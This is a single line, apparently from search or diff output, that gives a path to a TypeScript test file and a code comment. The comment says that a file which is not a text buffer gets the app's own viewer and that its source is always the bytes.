+C:/Dev/reader/worktrees/residue\packages\core\src\kind\registry.test.ts:280:// B5 and C1: a file that is not a text buffer has a viewer of the app's own. Source is always the bytes.
